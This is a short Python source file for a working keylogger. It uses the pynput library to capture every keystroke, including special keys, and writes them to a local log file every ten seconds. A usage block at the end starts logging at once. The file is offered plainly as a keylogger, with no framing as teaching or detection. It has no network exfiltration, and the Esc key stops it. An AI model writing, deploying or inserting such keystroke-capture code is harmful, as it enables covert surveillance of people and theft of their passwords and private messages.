import threading
from pynput import keyboard

class KeyLogger:

    def __init__(self, time_interval, log_file):
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.log_file = log_file

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def write_to_file(self):
        with open(self.log_file, "a") as file:
            file.write(self.log)
        self.log = ""

    def report_and_save(self):
        self.write_to_file()
        timer = threading.Timer(self.interval, self.report_and_save)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_and_save()
            keyboard_listener.join()

# Usage example
log_file = "keylog.txt"  # The log will be saved in keylog.txt in the current directory
keylogger = KeyLogger(10, log_file)
keylogger.start()